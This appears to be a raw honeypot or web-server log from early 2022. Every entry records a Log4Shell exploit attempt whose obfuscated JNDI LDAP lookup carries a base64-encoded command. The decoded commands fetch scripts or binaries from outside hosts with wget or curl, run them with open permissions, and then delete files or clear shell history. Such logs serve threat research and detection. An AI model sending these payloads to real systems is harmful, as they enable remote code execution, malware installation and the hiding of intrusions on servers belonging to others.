2022-01-28T03:52:03,34.139.236.80:58060,80.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzE5Mi45NS41MC4yMjgvYmlucy5zaCAtbyBiaW5zLnNoOyB3Z2V0IGh0dHA6Ly8xOTIuOTUuNTAuMjI4L2JpbnMuc2g7IGNobW9kIDc3NyBiaW5zLnNoOyBzaCBiaW5zLnNoOyBybSAtcmYgYmlucy5zaDsgaGlzdG9yeSAtYyA=}')
2022-01-28T18:01:42,34.75.174.223:41198,80.,/solr/admin/collections?action=t(%27$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzE5Mi45NS41MC4yMjgvYmlucy5zaCAtbyBiaW5zLnNoOyB3Z2V0IGh0dHA6Ly8xOTIuOTUuNTAuMjI4L2JpbnMuc2g7IGNobW9kIDc3NyBiaW5zLnNoOyBzaCBiaW5zLnNoOyBybSAtcmYgYmlucy5zaDsgaGlzdG9yeSAtYyA=%7D%27)&wt=json
2022-01-28T18:01:42,34.75.174.223:41198,80.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzE5Mi45NS41MC4yMjgvYmlucy5zaCAtbyBiaW5zLnNoOyB3Z2V0IGh0dHA6Ly8xOTIuOTUuNTAuMjI4L2JpbnMuc2g7IGNobW9kIDc3NyBiaW5zLnNoOyBzaCBiaW5zLnNoOyBybSAtcmYgYmlucy5zaDsgaGlzdG9yeSAtYyA=}')
2022-01-28T22:07:18,167.99.62.49:34346,110.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//191.235.110.104:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzQ1LjU1LjM4LjE0NC84VXNBLnNoOyBjdXJsIC1PIGh0dHA6Ly80NS41NS4zOC4xNDQvOFVzQS5zaDsgY2htb2QgNzc3IDhVc0Euc2g7IHNoIDhVc0Euc2g=}')
2022-01-31T07:56:16,34.75.66.35:34656,80.,/?id=t(%27$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzEzNS4xNDguOTEuMTQ2L2JpbnMuc2ggLW8gYmlucy5zaDsgd2dldCBodHRwOi8vMTM1LjE0OC45MS4xNDYvYmlucy5zaDsgY2htb2QgNzc3IGJpbnMuc2g7IHNoIGJpbnMuc2g7IHJtIC1yZiBiaW5zLnNoOyBoaXN0b3J5IC1j%7D%27)
2022-01-31T07:56:16,34.75.66.35:34656,80.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzEzNS4xNDguOTEuMTQ2L2JpbnMuc2ggLW8gYmlucy5zaDsgd2dldCBodHRwOi8vMTM1LjE0OC45MS4xNDYvYmlucy5zaDsgY2htb2QgNzc3IGJpbnMuc2g7IHNoIGJpbnMuc2g7IHJtIC1yZiBiaW5zLnNoOyBoaXN0b3J5IC1j}')
2022-02-03T13:55:43,35.227.17.237:57536,80.,/?id=t(%27$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzEzNS4xNDguOTEuMTQ2L2JpbnMuc2ggLW8gYmlucy5zaDsgd2dldCBodHRwOi8vMTM1LjE0OC45MS4xNDYvYmlucy5zaDsgY2htb2QgNzc3IGJpbnMuc2g7IHNoIGJpbnMuc2g7IHJtIC1yZiBiaW5zLnNoOyBoaXN0b3J5IC1j%7D%27)
2022-02-03T13:55:43,35.227.17.237:57536,80.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//5.181.80.103:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzEzNS4xNDguOTEuMTQ2L2JpbnMuc2ggLW8gYmlucy5zaDsgd2dldCBodHRwOi8vMTM1LjE0OC45MS4xNDYvYmlucy5zaDsgY2htb2QgNzc3IGJpbnMuc2g7IHNoIGJpbnMuc2g7IHJtIC1yZiBiaW5zLnNoOyBoaXN0b3J5IC1j}')
2022-02-05T03:45:50,198.98.61.124:55180,111.,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8xNTguMTAxLjExOC4yMzYvc3NoZF9wdHk7IGN1cmwgLU8gaHR0cDovMTU4LjEwMS4xMTguMjM2L3NzaGRfcHR5OyBjaG1vZCA3Nzcgc3NoZF9wdHk7IC4vc3NoZF9wdHkgZXhwbG9pdA==}')
2022-02-09T18:22:47,35.231.114.220:51184,187.,/?id=t(%27$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D//45.61.187.34:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzEzNS4xNDguOTEuMTQ2L2JpbnMuc2ggLW8gYmlucy5zaDsgd2dldCBodHRwOi8vMTM1LjE0OC45MS4xNDYvYmlucy5zaDsgY2htb2QgNzc3IGJpbnMuc2g7IHNoIGJpbnMuc2g7IHJtIC1yZiBiaW5zLnNoOyBoaXN0b3J5IC1j%7D%27)
2022-02-09T18:22:47,35.231.114.220:51184,187.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//45.61.187.34:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzEzNS4xNDguOTEuMTQ2L2JpbnMuc2ggLW8gYmlucy5zaDsgd2dldCBodHRwOi8vMTM1LjE0OC45MS4xNDYvYmlucy5zaDsgY2htb2QgNzc3IGJpbnMuc2g7IHNoIGJpbnMuc2g7IHJtIC1yZiBiaW5zLnNoOyBoaXN0b3J5IC1j}')
2022-02-10T17:24:23,34.74.101.20:40866,187.,/api/v1/?id=t(%27$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D//45.61.187.34:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzEzNS4xNDguOTEuMTQ2L2JpbnMuc2ggLW8gYmlucy5zaDsgd2dldCBodHRwOi8vMTM1LjE0OC45MS4xNDYvYmlucy5zaDsgY2htb2QgNzc3IGJpbnMuc2g7IHNoIGJpbnMuc2g7IHJtIC1yZiBiaW5zLnNoOyBoaXN0b3J5IC1j%7D%27)
2022-02-10T17:24:23,34.74.101.20:40866,187.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//45.61.187.34:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IGN1cmwgaHR0cDovLzEzNS4xNDguOTEuMTQ2L2JpbnMuc2ggLW8gYmlucy5zaDsgd2dldCBodHRwOi8vMTM1LjE0OC45MS4xNDYvYmlucy5zaDsgY2htb2QgNzc3IGJpbnMuc2g7IHNoIGJpbnMuc2g7IHJtIC1yZiBiaW5zLnNoOyBoaXN0b3J5IC1j}')
2022-02-14T06:51:37,144.22.197.146:54602,111.,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCBleHBsb2l0Lng4Ng==}')
2022-02-14T07:09:10,144.22.197.146:53374,111.,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCBleHBsb2l0Lng4Ng==}')
2022-02-14T10:16:15,144.22.197.146:45016,111.,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCBleHBsb2l0Lng4Ng==}')
2022-03-03T02:49:34,147.182.187.122:34484,185.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//147.182.185.86:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vNTEuMTYxLjY0LjE5Ny84VXNBMi5zaDsgY3VybCAtTyBodHRwOi8vNTEuMTYxLjY0LjE5Ny84VXNBMi5zaDsgY2htb2QgNzc3IDhVc0EyLnNoOyBzaCA4VXNBMi5zaDtybSAtcmYgKg==}')
2022-03-03T03:06:53,147.182.187.122:36000,185.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//147.182.185.86:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vNTEuMTYxLjY0LjE5Ny84VXNBMi5zaDsgY3VybCAtTyBodHRwOi8vNTEuMTYxLjY0LjE5Ny84VXNBMi5zaDsgY2htb2QgNzc3IDhVc0EyLnNoOyBzaCA4VXNBMi5zaDtybSAtcmYgKg==}')
2022-03-08T09:55:45,144.22.220.23:49744,111.,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2Ly5rZXkvdXBkYXRlOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvLmtleS91cGRhdGU7IGNobW9kIDc3NyB1cGRhdGU7IC4vdXBkYXRlIHNlcnZlcnMueDg2}')
2022-03-12T21:39:46,167.71.191.209:60480,191.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//165.227.191.61:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE2NS4yMjcuMjIxLjQzLzhVc0Euc2g7IGN1cmwgLU8gaHR0cDovLzE2NS4yMjcuMjIxLjQzLzhVc0Euc2g7IGNobW9kIDc3NyA4VXNBLnNoOyBzaCA4VXNBLnNo}')
2022-03-13T17:31:04,209.97.152.53:58166,58.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//167.99.58.80:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE2NC45MC4xMjguMjQvOFVzQS5zaDsgY3VybCAtTyBodHRwOi8vMTY0LjkwLjEyOC4yNC84VXNBLnNoOyBjaG1vZCA3NzcgOFVzQS5zaDsgc2ggOFVzQS5zaA==}')
2022-03-17T14:51:54,45.85.190.62:44254,127.,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//77.247.127.112:1389/TomcatBypass/Command/Base64/d2dldCAxNjAuMjAuMTQ1LjIyNS9iaW5zL3h4eC54ODY7IGNobW9kIDc3NyB4eHgueDg2OyAuL3h4eC54ODY=}')
2022-03-19T23:18:06,137.184.45.98:56412,196.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//178.62.196.118:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vNTEuMTYxLjY0LjE5Ny84VXNBMi5zaDsgY3VybCAtTyBodHRwOi8vNTEuMTYxLjY0LjE5Ny84VXNBMi5zaDsgY2htb2QgNzc3IDhVc0EyLnNoOyBzaCA4VXNBMi5zaDsgcm0gLXJmICo=}')
2022-03-20T08:00:51,137.184.45.98:46308,196.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//178.62.196.118:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vNTEuMTYxLjY0LjE5Ny84VXNBMi5zaDsgY3VybCAtTyBodHRwOi8vNTEuMTYxLjY0LjE5Ny84VXNBMi5zaDsgY2htb2QgNzc3IDhVc0EyLnNoOyBzaCA4VXNBMi5zaDsgcm0gLXJmICo=}')
2022-03-21T06:18:22,137.184.45.98:39028,196.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//178.62.196.118:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vNTEuMTYxLjY0LjE5Ny84VXNBMi5zaDsgY3VybCAtTyBodHRwOi8vNTEuMTYxLjY0LjE5Ny84VXNBMi5zaDsgY2htb2QgNzc3IDhVc0EyLnNoOyBzaCA4VXNBMi5zaDsgcm0gLXJmICo=}')
2022-03-22T06:18:22,137.184.45.98:40462,196.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//178.62.196.118:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vNTEuMTYxLjY0LjE5Ny84VXNBMi5zaDsgY3VybCAtTyBodHRwOi8vNTEuMTYxLjY0LjE5Ny84VXNBMi5zaDsgY2htb2QgNzc3IDhVc0EyLnNoOyBzaCA4VXNBMi5zaDsgcm0gLXJmICo=}')
2022-03-23T11:40:18,144.22.220.23:53806,111.,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvY2NsZWFyOyBjdXJsIC1PIGh0dHA6Ly8xNDAuMjM4LjE4MC4zNC9jY2xlYXI7IGNobW9kIDc3NyBjY2xlYXI7IC4vY2NsZWFyIHNlcnZlcnMueDg2}')
2022-03-23T12:29:07,129.151.35.240:55130,111.,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvY2NsZWFyOyBjdXJsIC1PIGh0dHA6Ly8xNDAuMjM4LjE4MC4zNC9jY2xlYXI7IGNobW9kIDc3NyBjY2xlYXI7IC4vY2NsZWFyIHNlcnZlcnMueDg2}')
2022-03-27T04:31:52,45.85.190.62:40552,127.,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//77.247.127.112:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTYwLjIwLjE0NS4yMjUvbmF0aW9uYWwvZG90c2gueDg2OyBjaG1vZCA3NzcgZG90c2gueDg2OyAuL2RvdHNoLng4NiBKRVdTIA==}')
2022-03-27T12:12:38,129.151.35.240:39060,111.,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvaW5pdDIzOyBjdXJsIC1PIGh0dHA6Ly8xNDAuMjM4LjE4MC4zNC9pbml0MjM7IGNobW9kIDc3NyBpbml0MjM7IC4vaW5pdDIzIHJ1bm5lcg==}')
2022-04-01T00:12:24,129.151.35.240:42892,111.,t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvaW5pdDIzOyBjdXJsIC1PIGh0dHA6Ly8xNDAuMjM4LjE4MC4zNC9pbml0MjM7IGNobW9kIDc3NyBpbml0MjM7IC4vaW5pdDIzIHJ1bm5lcg==}')
2022-04-01T04:22:27,188.127.235.79:57530,27.,t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//143.198.27.242:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzIwMC4xNTAuMjAyLjE3MS84VXNBLnNoOyBjdXJsIC1PIGh0dHA6Ly8yMDAuMTUwLjIwMi4xNzEvOFVzQS5zaDsgY2htb2QgNzc3IDhVc0Euc2g7IHNoIDhVc0Euc2g=}')
